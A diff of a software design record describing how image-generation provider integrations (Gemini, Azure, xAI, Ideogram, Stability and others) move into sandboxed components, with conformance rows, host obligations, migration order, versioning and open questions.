 `crates/south-component-conformance/` do carry usage expectations (e.g. `fixtures/provider.response.cached-usage.*`,
 `fixtures/provider.stream.no-usage.*`, `fixtures-wan-image-task-v2/task-v2.observation.caps-absurd-count.*`). What is
 missing is **enforcement**: no existing check requires a component to carry metering samples (`report.rs:19-64` has no
-such variant). The first two rows above add exactly that. The boundary record reaches the same finding for the
+such variant). The metering rows above add exactly that. The boundary record reaches the same finding for the
 provider world (§6.1 there) and enforces usage rows by name in gate ② (§6.2 there).
 
 ### 12.2 Metering samples are DP1's "usage samples"
 
-The `metering_sample` and `missing_meter_is_not_zero` rows are exactly what P21 DP1 requires as "passing conformance
-with usage samples". The samples are transcribed from the server's native arms (the P13 S8 pattern: native arm →
-hand-written frozen expectation → real wasm comparison), never back-derived from component output.
+The `metering_sample`, `missing_meter_is_not_zero` and `evidence_absent_is_null` rows are exactly what P21 DP1
+requires as "passing conformance with usage samples". The samples are transcribed from the server's native arms (the
+P13 S8 pattern: native arm → hand-written frozen expectation → real wasm comparison), never back-derived from component
+output.
 
 ### 12.3 Host obligations (gate ③; a host suite, not part of the component suite)
 
-1. Determinism of §6.2's elision rules (same document, same declarations → same view); refusal of `$south.` keys.
-2. The §6.7 encoder: if D3b-B is adopted, the host uses south's encoder; if A, the host's encoded result decodes back
-   to a part list equal to the original part list.
+1. The host produces request and response views with south's `elide_v1`, or reproduces every golden vector of it byte
+   for byte (§6.2); refusal of `$south.` keys and of duplicate keys. Self-consistency alone is not enough: the
+   obligation is agreement with the vectors, which is what makes two hosts agree with each other.
+2. The §6.7 parser and encoder: if D3b-B is adopted, the host uses south's; if A, the host's results match south's
+   golden vectors after decoding.
 3. Every §11 safe fetch vector is refused.
-4. §10.2's verify-then-settle ordering: no `finalize` when a fetch fails.
+4. §10.2's verify-then-settle ordering: no `finalize` when a fetch fails or `render` fails after upstream success.
 5. No extra configuration is injected into `immutable_body_paths`, their ancestors or their descendants (same rule as
    task contract 6 §4).
 6. Undeclared operations and undeclared metering forms are refused before admission.
 7. The precedence between image component routes and task component routes is pinned by a test; a model never hits
    both.
+8. Reference expansion, body encoding and every §6.3a size refusal happen before admission (before the 202 on the
+   held path); every response is read through a binary-response entry point.
+9. The bounds of §9.4 item 3 are the host's own; a component `bounds` value lowers the reservation and is never used
+   as the check bound.
 
 ## 13. Mapping of the existing execution arms
 
 | Execution arm | Request | Auth | Artifact | Metering form | World capability needed |
 |---|---|---|---|---|---|
-| Gemini (generate / edit) | JSON `:generateContent`; reference / edit images inlined via `base64`; an edit with a mask → refused in `prepare` | `header_secret` `x-goog-api-key` | `inline base64` | `tokens` or `images` | `repeat`; response elision paths |
+| Gemini (generate / edit) | JSON `:generateContent`; reference / edit images inlined via `base64`; an edit with a mask → refused in `prepare` | `header_secret` `x-goog-api-key` | `inline base64` | `tokens` (declared buckets) or `images` | `repeat`; response elision paths; tier word `resolution` (Nano Banana) after Q8 |
 | Vertex (Nano Banana) | same, with project / region in the URL, taken from an exported credential attribute or non-secret config (boundary record §3.3, §7.3) | `bearer`; the slot is `minted` by the service-account credential recipe (boundary record §3.3) | same | same | same + credential recipe (boundary record §3, phase B4) |
-| Azure MAI / Foundry | JSON, `size → width/height`; n=1, b64 only (`azure.rs:14-39,204-227`); edit is multipart | `header_secret` `api-key` | `inline base64` | `tokens` (missing → `unknown`) or `images` | — |
-| MiniMax | JSON, `GroupId` query; `b64_json → base64` | `bearer` | `url` or `inline base64` | `images` (`images_reported = success_count`) | error detection on HTTP 200 |
-| Bailian Qwen-Image | JSON, `size → W*H`, n 1..=6 | `bearer` | `url` | `images` (`image_count`) | — |
-| Ideogram | **multipart** described by the component (`text_prompt`, `rendering_speed`, `resolution`), n=1 | `header_secret` `api-key` | `url`; b64 delivery goes through the second hop | `images`, tier word `speed` | multipart encoding; safe fetch; §10.2 |
-| Stability | **multipart**, `Accept: application/json`, n=1, b64 only | `bearer` | `inline base64` | `images` (`finish_reason = CONTENT_FILTERED` is also charged today, `stability.rs:548-583`) | multipart encoding |
-| xAI generate | JSON, `size → resolution` inside the component | `bearer` | as the upstream returns it | `images` + `upstream_cost` + `tier_candidates` | tier evidence |
-| xAI edit (P18) | JSON, `images` / `image` → `input_image`; the client's data URL `as_is` | `bearer` | as the upstream returns it | same; the input image count goes into `inputs` | request-side elision paths |
-| OpenAI-compatible fallback (DI4) | JSON with only `model` changed; edit is a multipart part list, each part `as_is`, only `model` changed | `bearer` / `header_secret` | `inline` or `url` | `tokens` or `images` | render fidelity (§7) |
-| Reve bridge | JSON `/v1/image/create`, n=1, png only | `bearer` | `inline` or `body` | `credits` | `charged_failure` |
+| Azure MAI / Foundry | JSON, `size → width/height`; n=1, b64 only (`azure.rs:14-39,200-227`); edit is multipart | `header_secret` `api-key` | `inline base64` | `tokens` (a missing declared bucket → `unknown`) or `images` | edit: multipart with binary response (§6.3a) |
+| MiniMax | JSON, `GroupId` query; `b64_json → base64` | `bearer` | `url` (pointer) or `inline base64` | `images` (evidence `images_reported = success_count`) | error detection on HTTP 200 |
+| Bailian Qwen-Image | JSON, `size → W*H`, n 1..=6 | `bearer` | `url` (pointer) | `images` (evidence `images_reported = image_count`) | — |
+| Ideogram | **multipart** described by the component (`text_prompt`, `rendering_speed`, `resolution`), n=1; the speed is derived from the SKU, not a tier word | `header_secret` `api-key` | `url` (pointer); b64 delivery goes through the second hop | `images` | multipart encoding; safe fetch; §10.2 |
+| Stability | **multipart**, `Accept: application/json`, n=1, b64 only | `bearer` | `inline base64` | `images` (`finish_reason = CONTENT_FILTERED` is also charged today, `stability.rs:548-583`) | multipart encoding; multipart with binary response (§6.3a) |
+| xAI generate | JSON, `size → resolution` inside the component | `bearer` | as the upstream returns it | `images` + `tier_candidates` + evidence `upstream_cost` | tier evidence; tier-keyed price list (Q8) |
+| xAI edit (P18) | JSON, `images` / `image` → `input_image`; the client's data URL `as_is` | `bearer` | as the upstream returns it | same; the input image count goes into `inputs` | request-side elision paths; Q8 |
+| OpenAI-compatible fallback (DI4) | JSON with only `model` changed; edit is a multipart part list, each part `as_is`, only `model` changed | `bearer` / `header_secret` | `inline` or `url` (pointer) | `tokens` (declared buckets, `cached_input`) or `images` | render fidelity (§7); edit: multipart with binary response (§6.3a) |
+| Reve bridge | JSON `/v1/image/create`, n=1, png only, `Accept: application/json` (`reve.rs:572`) | `bearer` | `inline` | `credits` | `charged_failure` |
 
 The OpenAI-compatible fallback moves into a component (DI4), overturning P18 D5's "stays in the host". P18 worried
 about "one more copy and more latency": in this design that copy happens in the host-side encoder and the bytes do not
@@ -635,18 +866,23 @@ from silently falling into this fallback once its arm is deleted (P22 §8); that
 
 ## 14. Migration order and dual-run acceptance
 
-**Order** (P22 I2–I4 merged with P18 I3; the first batch of one south minor ships the world, the contracts, the
-encoder and the Azure and xAI components):
+**Order** (P22 I2–I4 merged with P18 I3; the first batch of one south minor ships the world, `contracts.media` v1 with
+the full vocabulary of §6.4, the parser / elider / encoder, HTTP contract 10 (§6.3a) and the Azure and xAI
+components):
 
-1. **I2**: Azure (generate + edit), xAI (generate + edit). Pure JSON, lowest risk; Azure covers "missing usage is
-   `unknown`", xAI covers tier evidence and request-side elision.
-2. **I3-1**: MiniMax, Bailian Qwen-Image, the OpenAI-compatible fallback.
-3. **I3-2**: Gemini. **Prerequisite**: the host first fixes "missing `usageMetadata` settles at $0" per §9.2, or the
-   dual run would pin this defect as correct (the same risk as P21 §6).
+1. **I2**: Azure (generate + edit), xAI (generate + edit). Azure covers "a missing declared bucket is `unknown`" and
+   needs HTTP contract 10 for its multipart edit; xAI covers tier evidence and request-side elision.
+   **Prerequisite for xAI**: the host's tier-keyed price list (§8, Q8). If Q8 has not landed, I2 ships Azure alone
+   and xAI moves after it.
+2. **I3-1**: MiniMax, Bailian Qwen-Image, the OpenAI-compatible fallback (its edit needs HTTP contract 10).
+3. **I3-2**: Gemini. The earlier prerequisite ("the host first fixes missing `usageMetadata` settling at $0") is done
+   (P22-F5, `b8f63414`). **New prerequisite for Nano Banana per-image rows**: Q8, as for xAI. Token-priced rows do not
+   need Q8.
 4. **I3-3**: Vertex, waiting for credential recipe v1 (boundary record §3; phase B4 there, which unlocks P21 S3 and
    P22 Vertex).
-5. **I3-4**: Stability, needs the host-side encoder (§6.7).
-6. **I3-5**: Ideogram, needs the safe fetch executor and §10.2; acceptance adds the three download-failure fixtures.
+5. **I3-4**: Stability, needs the encoder (§6.7) and HTTP contract 10.
+6. **I3-5**: Ideogram, needs the safe fetch executor (including the new §11 item 3 rows) and §10.2; acceptance adds the
+   three download-failure fixtures.
 7. **I3-6**: the Reve bridge, in the same batch as P18's Reve edit, so that neither side migrates twice.
 
 At each provider's cutover, the synchronous path and the held path switch to the component **at the same time**
@@ -660,19 +896,27 @@ At each provider's cutover, the synchronous path and the held path switch to the
 | Upstream request | JSON body equal by value; multipart equal as **decoded part lists** (name, order, file name, media type, byte digest), boundary not compared; headers equal |
 | Client response | JSON equal by value (the host re-serializes; whitespace and key order not compared); bytes equal after b64 decoding |
 | Pre-dispatch refusal | status code and timing (before admission) equal; the text may differ where §8 lists the generalisation |
-| Reservation bound | equal |
+| Reservation bound | equal where the component supplies no tightening `bounds` and the host bound formula is unchanged; otherwise recorded and explained |
 | Settlement | metering kinds, values and amounts equal |
-| Held path | 202 → terminal state → artifact → settlement, equal item by item |
+| Held path | 202 → terminal state → artifact → settlement, equal item by item (each path keeps today's funds behaviour, §9.2) |
 
-**What the dual run cannot prove**: the same as the old behaviour ≠ correct. The Ideogram download failure (§10.2)
-and Gemini's missing usage (§9.2) need fixtures written against the new ledger state and must not be accepted as
-"matches native". In addition, run a negative case with images on a synthetic provider to prove that host precheck
-does not recognise provider names (J2) — the image-world counterpart of the boundary record's unseen-provider guest
-(T21), §12 there.
+**What the dual run cannot prove**: the same as the old behaviour ≠ correct. These need fixtures written against the
+new ledger state and must not be accepted as "matches native":
+
+- the Ideogram download failure (§10.2);
+- a response missing one declared token bucket — today it settles low, afterwards it is `unknown` (§9.1);
+- Ideogram's all-filtered result on the held path after the dual run — today parked, afterwards released (§9.2);
+- a response between 32 and 64 MiB on a multipart edit — today delivered by the native arm, and the proof that the
+  binary-response path delivers it too (§6.3a);
+- a JSON request body above 32 MiB after expansion — refused before admission (§6.3a); every such case the dual run
+  sees is recorded.
+
+In addition, run a negative case with images on a synthetic provider to prove that host precheck does not recognise
+provider names (J2) — the image-world counterpart of the boundary record's unseen-provider guest (T21), §12 there.
 
 ## 15. Versioning
 
-A South **minor**. Released worlds and contracts are unchanged:
+A South **minor**. Released worlds and contracts are unchanged; one transport shape is added:
 
 - A new WIT file `crates/south-provider-api/wit/image-adapter.wit`; `manifest.rs` gains `IMAGE_WIT_PACKAGE`,
   `IMAGE_WORLD`, `IMAGE_BEHAVIOR_SUITE`, `IMAGE_CAPABILITIES` (`generate`, `edit`) and `IMAGE_WORLD_SCHEMA`, one row in
@@ -681,16 +925,23 @@ A South **minor**. Released worlds and contracts are unchanged:
 - Runtime: `bindings.rs` gains one `bindgen!` module, `InstanceKind` gains one variant (`component.rs:73-77`), and the
   link condition for the host import becomes a world property (`:182`). **The runtime limits are unchanged** —
   exactly the payoff of §6.
-- `south-contracts`: new modules `media` (request view, descriptor, transforms, response view, the safe fetch pure
-  functions) and `image` (facts, outcomes, artifacts). JSON codecs and types containing `ErrorEnvelope` go into
-  conformance, following the task v2 precedent (`component_v2.rs:13-37`).
-- `compatibility.json`: `contracts.media: 1`, `contracts.image: 1`, `media_limits` (fallback threshold, count and
-  length of elision paths, `repeat` limit, artifact URL length, part count limit),
-  `conformance.image_component_v1_suite_id`, the per-crate capability strings, and a host verification block
-  (`not_verified` at first release).
-- `HTTP_CONTRACT_VERSION` is unchanged (§6.3: the image surface falls within the three existing shapes).
+- `south-contracts`: new modules `media` (request view, descriptor and `MediaAuthV1`, transforms, response view,
+  `response_body_form`, `parse_multipart_parts_v1`, `elide_v1`, `encode_multipart_v1`, the safe fetch pure
+  functions, and their golden vectors) and `image` (facts, outcomes, artifacts). The SSE decoder `decode_sse_v1`
+  that the speech world needs also lives in `south-contracts`, as the SSE sibling of the eventstream deframer
+  (boundary record §5.2), and is released with this minor. JSON codecs and
+  types containing `ErrorEnvelope` go into conformance, following the task v2 precedent (`component_v2.rs:13-37`), as
+  does `admit_media_descriptor_auth`.
+- `south-core`: `execute_multipart_binary_call_v1` and its raw twin (§6.3a). `HTTP_CONTRACT_VERSION` 9 → 10
+  (`lib.rs:59`): one bump, in this minor, carrying both this twin and the speech record's D3a
+  `TextPostRequestV1` with its binary execution entry point.
+- `compatibility.json`: `contracts.media: 1` (the full vocabulary of §6.4, released once), `contracts.image: 1`,
+  `media_limits` (fallback threshold, count and length of elision paths, `repeat` limit, artifact URL length, part
+  count limit), `conformance.image_component_v1_suite_id`, the per-crate capability strings, and a host verification
+  block (`not_verified` at first release).
 - If this lands together with the compatibility range of the boundary record §8, image packages declare
-  `contracts: {"media": 1, "image": 1}` (as embeddings packages declare `{"embeddings": 1}`, embeddings record §12).
+  `contracts: {"media": 1, "image": 1}` (as embeddings packages declare `{"media": 1, "embeddings": 1}`, embeddings
+  record §12).
 
 ## 16. Rejected alternatives
 
@@ -702,15 +953,23 @@ A South **minor**. Released worlds and contracts are unchanged:
   single instance serially (`component.rs:136`), so large image requests would queue behind one another; for
   concurrency the host could only open more instances, multiplying memory by the instance count. Option B keeps all of
   this outside the sandbox, at the cost of one closed transform table.
+- **Raise `MAX_RESPONSE_BODY_BYTES` from 32 to 64 MiB instead of adding a multipart binary twin** (§6.3a): it would
+  change the bound, and the buffer a host must be ready to hold, on every text path to serve a media-only need; the
+  additive twin follows the 0.26.0 precedent and leaves released bounds alone.
 - **Generic host rendering of the northbound body**: loses the field fidelity of the OpenAI-compatible pass-through,
   and cannot aggregate Gemini's multiple rounds (§7).
 - **The component declares "token-priced"**: crosses the vocabulary line (§9.3).
 - **The component infers the xAI tier from `cost_in_usd_ticks` on its own**: requires the component to know upstream
   price lists, which is pricing knowledge; instead the component reports the upstream quote and the host matches it
   against the candidate tiers (§9.4 item 4).
+- **`upstream_cost` as a metering form** (the earlier draft): nothing is billed in it; treating its absence as
+  `unknown` would park correctly billed xAI calls (§9.1).
+- **A component-written artifact URL** (the earlier draft): an egress channel out of the sandbox (§10.1).
+- **A component-supplied bound used for both reservation and check** (the earlier draft): makes the check as strong as
+  the component's honesty (§8, boundary record §6.3).
 - **An `oauth` auth arm for Vertex, added in a later minor** (this record's earlier draft): superseded by the boundary
   record §3 — the component declares a credential recipe, the host executes it and presents the minted slot as
-  `bearer`. The boundary record proposes deprecating the `oauth` arm (§3.7 there), so this world never admits it.
+  `bearer`. The boundary record proposes deprecating the `oauth` arm (§3.8 there), so this world never admits it.
 - **One synchronous media world holding image + speech (+ embeddings)**: the image and speech WIT signatures are
   almost identical (`model-capabilities` / `prepare` / `parse-response`, plus `render` for image; the embeddings world
   of the embeddings record §4 has a different function set), one component could serve the same upstream's image and
@@ -725,16 +984,64 @@ A South **minor**. Released worlds and contracts are unchanged:
 
 | # | Question | Recommendation | Decided by |
 |---|---|---|---|
-| Q1 | Multipart encoder and byte transforms as south host-side pure functions, or written by each host (§6.7) | South provides them; revise the "no encoder" half-sentence of 0.25.0 §2 | south maintainers |
-| Q2 | Elision rules: declared paths + fallback threshold; the threshold value; `unknown` when the `$south.` namespace collides with the upstream | As in §6.2, threshold 1 MiB | south maintainers |
-| Q3 | First-version contents of the closed transform table (§6.4 + the three speech items) | As listed in the two records, nothing reserved | south maintainers |
+| Q1 | Multipart part parser, elider, encoder and byte transforms as south host-side pure functions in `south-contracts::media`, or written by each host (§6.7) | South provides them with golden vectors and fuzz obligations; revise the "no encoder" half-sentence of 0.25.0 §2 and narrow "South has no business learning what a form field is" to the transport layer | south maintainers |
+| Q2 | Elision rules: declared paths + fallback threshold; the threshold value; `unknown` when the `$south.` namespace collides with the upstream; duplicate keys refused (§6.2) | As in §6.2, threshold 1 MiB | south maintainers |
+| Q3 | First-version contents of the closed transform table and body forms: `contracts.media` v1 carries the image and speech words, the `text` request body and the `sse` body form, released once (§6.4) | As listed, nothing reserved beyond them | south maintainers |
 | Q4 | Two worlds, or one synchronous media world (§16) | Separate, sharing `contracts.media` | lv — **ruled by lv, 2026-09-30: as recommended**; south maintainers — open |
 | Q5 | ARCHITECTURE.md's "a metering vocabulary must have a second consumer in sight" (`ARCHITECTURE.md:114-115`). **Not met today**: the release notes of 0.25.0 / 0.26.0 both state that the community host has no multipart surface and no byte-returning surface (`2026-09-09-multipart-request-body.md:189`, `2026-09-09-buffered-binary-response.md:302`). The same question is open as the boundary record Q9, the speech record Q9 and the embeddings record E-Q5 | Write P21 §7's "synchronous implementation recommended" into the release record as a written commitment, and mark `media_component_capabilities` `not_verified` until the community host lands; otherwise this vocabulary serves only one host and, under the current rules, should not be admitted | lv + south maintainers |
-| Q6 | Safe fetch: South provides the URL / address pure functions and the `south.safe-fetch.v1` host suite (§11 D8b) | Provide them | south maintainers |
-| Q7 | Does the synchronous path release the reservation on `rejected` (today the synchronous path is always `delivery_unknown`, while held releases on 4xx) | Keep the status quo during the dual run; afterwards unify as "`rejected` releases" | lv — **ruled by lv, 2026-09-30: as recommended** |
-| Q8 | Are the tier word dimensions (`resolution` / `quality` / `speed`) closed; host price lists keyed by component tier words (a host schema change) | Three closed dimensions; a new dimension goes through a `contracts.image` version | south maintainers + server |
+| Q6 | Safe fetch: South provides the URL / address pure functions and the `south.safe-fetch.v1` host suite, including the IPv4-embedding IPv6 ranges (§11 D8b) | Provide them | south maintainers |
+| Q7 | Does the synchronous path release the reservation on `rejected` (today the synchronous path is always `delivery_unknown`, while held releases on a first-round 4xx) | Keep the status quo during the dual run; afterwards unify as "`rejected` releases" | lv — **ruled by lv, 2026-09-30: as recommended**. Note (2026-10-01): the rule is now stated once in the boundary record §6.4 for every world with a `rejected` outcome |
+| Q8 | Tier words: are the dimensions (`resolution` / `quality`) closed; host price lists keyed by component tier words, with a per-model default word per dimension (a host schema change). **Now a prerequisite** of I2's xAI and I3-2's Nano Banana per-image rows (§8, §14) | Two closed dimensions; a new dimension goes through a `contracts.image` version; values fixed by the model row (Ideogram speed) are not tier words | south maintainers + server |
 | Q9 | "Settled count ≤ delivered + 1" stays in the host; the released `task-wan-image-v2` writes it into the component — reclaim it? | The image world keeps it in the host; the task side reclaims it at the next contract upgrade | south maintainers |
 | Q10 | The generalised 400 text differs from native (the Nano Banana tier gate) | Accept; P22 I4 acceptance compares status code and timing instead | lv — **ruled by lv, 2026-09-30: as recommended** |
 | Q11 | Vertex authentication is settled by the boundary record §3 (credential recipe; the `minted` slot is presented as `bearer`; this world admits no `oauth` arm, §4). What remains: is `host_signed` never admitted in this world | `host_signed` has no consumer and is not admitted | south maintainers |
 | Q12 | Is the OpenAI-compatible fallback one component covering OpenAI / Azure OpenAI / DeepInfra / BytePlus / GLM, or one per provider | One component; differences via `supported_parameters` words | server + south |
 | Q13 | Streaming image output (partial images) | Not included; a separate world version later | lv — **ruled by lv, 2026-09-30: as recommended** |
+| Q14 | Add `execute_multipart_binary_call_v1` (multipart POST, bytes response up to 64 MiB), taking HTTP contract 9 → 10 in one bump in this world's minor that also carries speech D3a's `TextPostRequestV1`; or raise the UTF-8 response limit (§6.3a, §16) | Add the twin; one bump carrying both new shapes | south maintainers |
+| Q15 | `url` artifacts as pointers into the upstream response rather than component-written URLs (§10.1), in every media world — the speech world's `url {pointer, media_type}` (speech §6) is covered by the same rule; and whether the task world should adopt it for URLs the host fetches | Pointers in both media worlds; assess the task world separately | south maintainers |
+| Q16 | Declared token buckets: every bucket a model declares must be present on a 2xx, or the round is `unknown` (§9.1); this parks responses the host settles low today | Adopt; the change is accepted by its own fixture, not by the dual run | south maintainers + server |
+
+## Revision note (2026-10-01)
+
+- Header: `Revised` line; baseline moved to south `3c1501a` and host `a82c852b`; line numbers re-checked.
+- §6.1 / §6.2 / §6.7: the multipart splitter (`parse_multipart_parts_v1`) and the elider (`elide_v1`) become south
+  pure functions in `south-contracts::media` with golden vectors; elision now fixes traversal, ids, `bytes`, `head`,
+  key handling, duplicate keys and view serialization; long multipart text parts are elided too.
+- §6.3: `GET` dropped (no consumer); `auth` typed as `MediaAuthV1`, admitted by a south twin of the boundary record's
+  §4.2 function; reference expansion and encoding happen before admission, also before the held path's 202.
+- §6.3a (new): the "no new transport shape" claim is withdrawn; every media call reads its response as bytes; a
+  multipart binary-response twin is proposed with HTTP contract 9 → 10, shared with speech D3a (Q14). No change is
+  proposed for the 32 MiB JSON request limit; the reason is given there.
+- §6.4 / §6.5: `contracts.media` v1 carries the full image + speech vocabulary (incl. `sample_rate`), released once;
+  "framing" renamed `response_body_form`.
+- §7: model-capabilities cached by (package digest, provider-config digest); a closed table of artifact deliveries
+  (no `inline`/`body` → `url` in v1); a `render` failure after upstream success is `unknown` with no `finalize`.
+- §8: bounds follow the boundary record §6.3 — host bounds for checks, component bounds only tighten the
+  reservation; tier words defined as request-time choices (Ideogram speed removed); tier-keyed prices made a
+  prerequisite (Q8); flat-row rule defined with per-model default words; stale P22-F6 text updated.
+- §9.1: `upstream_cost` is an evidence fact, not a form; required vs evidence facts per form; unattributed
+  `cached_input` bucket; declared token buckets must all be present (Q16).
+- §9.2 / §10.3: stale P22-F5 text updated; Ideogram all-filtered as `rejected` with its held-path effect after the
+  dual run; the `rejected` refund rule now points to the boundary record.
+- §9.4: checks use host bounds only; missing `upstream_cost` falls back to the default candidate.
+- §10.1: `url` artifacts are pointers into the upstream response (Q15); stale P22-F7 text updated; Reve bridge is
+  `inline` only.
+- §11: IPv4-embedding IPv6 ranges and `fec0::/10` added to the forbidden list and the test vectors.
+- §12: `evidence_absent_is_null` and `auth_errors_are_not_retriable` rows added; host obligations tied to golden
+  vectors, pre-admission sizing and host-only check bounds.
+- §13 / §14: arms remapped; Q8 and HTTP contract 10 made explicit prerequisites; the "cannot prove" list extended.
+- Not adopted: no transport change for JSON request bodies above 32 MiB (§6.3a gives the reason); the task world's
+  own artifact-URL exposure is noted as an open question (Q15) rather than resolved here.
+- Consistency pass, bounds (§8, §9.4): the image instance of the boundary record §6.3 rule is stated as a table,
+  including that media bytes do not count toward any bound and that credits have no request-derived bound; every
+  check compares against the host bound only.
+- Consistency pass, `url` artifacts (§10.1, Q15): the pointer rule is stated for every media world; speech's
+  `url {pointer, media_type}` is named as covered.
+- Consistency pass, citations: the `oauth` arm deprecation is cited as boundary record §3.8 (§4, §16); the `rejected`
+  rule is cited as boundary record §6.4 (header, §9.2, Q7), with a note that a 2xx proving nothing was produced
+  (Ideogram) is the same outcome.
+- Consistency pass, `decode_sse_v1` (§6.5, §6.7, §15): it lives in `south-contracts` as the SSE sibling of the
+  eventstream deframer (boundary record §5.2), released with this minor; it is no longer listed as part of `media`.
+- Consistency pass, HTTP contract 10 (§6.3a, §15, Q14): one bump, in this world's minor, carrying both
+  `execute_multipart_binary_call_v1` and speech's `TextPostRequestV1`; ASR uses the multipart binary twin.
+- Consistency pass, §15: the embeddings declaration is quoted correctly as `{"media": 1, "embeddings": 1}`.
